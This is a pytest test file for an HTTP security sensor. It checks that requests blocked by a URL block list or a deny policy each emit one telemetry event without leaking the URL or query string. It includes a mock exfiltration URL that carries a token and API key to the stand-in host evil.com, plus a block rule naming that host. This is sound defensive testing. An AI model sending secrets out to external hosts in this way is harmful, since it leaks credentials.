"""BUG-1: a destination-level block must emit exactly ONE telemetry event.

Both block paths in ``ProtectedHttpClient._check_destination`` (the operator
blocked-URL list and the deny-destination policy) raise DelphiBlockedError
BEFORE any scan_* method runs, so before the fix they produced no audit record
at all — a blocked exfiltration attempt invisible to the SIEM, contradicting
"every scan emits one structured telemetry event".

Discipline:
  * Telemetry is delivered from a BACKGROUND thread in batches, so every
    assertion runs after ``close_sync()``. An unflushed assert passes vacuously.
  * An httpx.MockTransport records what actually reaches the wire, so "blocked"
    is observed (nothing sent), not inferred. No real network is touched.
  * The privacy assertion greps the SERIALIZED event, so a secret smuggled into
    any nested field is caught, not just the fields this test knows to look at.
"""
from __future__ import annotations

import json

import pytest

httpx = pytest.importorskip("httpx")

from xaidr.sensor import DelphiSensor
from xaidr.types import DelphiBlockedError

BENIGN_BODY = {"message": "please summarize the quarterly earnings report"}
SECRET = "SECRET123"
SECRET_URL = f"http://evil.com/collect?token={SECRET}&api_key={SECRET}"

DENY_POLICY = {
    "version": "1",
    "defaults": {"effect": "allow", "unclassified": "allow"},
    "rules": [
        {
            "id": "block-evil",
            "effect": "block",
            "match": {"destination_identifier": ["evil.com", "*.evil.com"]},
        }
    ],
}


class CapturingReporter:
    """Collects every delivered batch so events can be counted exactly."""

    def __init__(self):
        self.events = []

    def report(self, batch):
        self.events.extend(batch)

    def close(self):
        pass


def _make(mode="block"):
    sent = []

    def handler(request):
        sent.append(str(request.url))
        return httpx.Response(200, json={"result": "ok"})

    cap = CapturingReporter()
    sensor = DelphiSensor(agent_id="dest-telemetry", enforcement_mode=mode, reporter=cap)
    client = sensor.protect_http(httpx.Client(transport=httpx.MockTransport(handler)))
    return sensor, client, sent, cap


def _blocked(fn):
    try:
        fn()
        return False
    except DelphiBlockedError:
        return True


def _drain(sensor, cap):
    """Flush the background telemetry thread, then return delivered events."""
    sensor.close_sync()
    return cap.events


# (a) blocked-URL list ─────────────────────────────────────────────────────
def test_blocked_url_emits_exactly_one_event():
    s, c, sent, cap = _make()
    s.block_urls(["evil.com"])

    assert _blocked(lambda: c.post("http://evil.com/collect", json=BENIGN_BODY))
    assert sent == [], "request left the host"

    events = _drain(s, cap)
    assert len(events) == 1, f"expected exactly 1 event, got {len(events)}"
    data = events[0]["data"]
    assert data["action"] == "blocked"
    assert data["category"] == "blocked_url"
    assert "URL_BLOCKED" in data["rules"]
    assert data["destinationIdentifier"] == "evil.com"
    assert data["destinationType"] == "external_api"
    assert data["enforcementMode"] == "block"
    assert data["direction"] == "a2a"


# (b) deny-destination policy ──────────────────────────────────────────────
def test_policy_deny_emits_exactly_one_event_with_rule_label():
    s, c, sent, cap = _make()
    assert s.set_policy(DENY_POLICY) is True

    assert _blocked(lambda: c.post("http://evil.com/collect", json=BENIGN_BODY))
    assert sent == []

    events = _drain(s, cap)
    assert len(events) == 1, f"expected exactly 1 event, got {len(events)}"
    data = events[0]["data"]
    assert data["action"] == "blocked"
    assert data["category"] == "policy"
    assert "policy:block-evil" in data["rules"], f"rule label missing: {data['rules']}"
    assert data["destinationIdentifier"] == "evil.com"


# (c) privacy: no URL, no query string ─────────────────────────────────────
@pytest.mark.parametrize("setup", ["blocklist", "policy"])
def test_emitted_event_carries_no_url_and_no_query_string(setup):
    s, c, sent, cap = _make()
    if setup == "blocklist":
        s.block_urls(["evil.com"])
    else:
        assert s.set_policy(DENY_POLICY) is True

    assert _blocked(lambda: c.post(SECRET_URL, json=BENIGN_BODY))
    assert sent == []

    events = _drain(s, cap)
    assert len(events) == 1
    blob = json.dumps(events[0], default=str)

    assert SECRET not in blob, f"secret leaked into telemetry: {blob}"
    assert "token=" not in blob, f"query string leaked into telemetry: {blob}"
    assert "?" not in blob, f"URL query separator present in telemetry: {blob}"
    assert "/collect" not in blob, f"URL path leaked into telemetry: {blob}"
    assert "http://" not in blob, f"full URL leaked into telemetry: {blob}"
    # ...but the destination host IS present — the event must stay actionable.
    assert events[0]["data"]["destinationIdentifier"] == "evil.com"


# (d) control: an allowed request still emits its normal event ─────────────
def test_allowed_request_still_emits_its_normal_event():
    s, c, sent, cap = _make()
    s.block_urls(["evil.com"])

    resp = c.post("http://billing.internal/ask", json=BENIGN_BODY)
    assert resp.status_code == 200
    assert sent == ["http://billing.internal/ask"], "allowed request did not reach the wire"

    events = _drain(s, cap)
    assert len(events) == 1, (
        f"allowed path should emit its single body-scan event, got {len(events)}"
    )
    data = events[0]["data"]
    assert data["action"] != "blocked"
    # The body scan event, not a destination-block event.
    assert data["category"] != "blocked_url"


def test_allowed_request_emits_no_destination_block_event():
    """The fix must not fire on the allow path (no phantom block records)."""
    s, c, sent, cap = _make()
    assert s.set_policy(DENY_POLICY) is True

    c.post("http://billing.internal/ask", json=BENIGN_BODY)
    events = _drain(s, cap)

    assert not [
        e for e in events if e["data"].get("category") in ("blocked_url", "policy")
    ], "an allowed destination produced a block event"
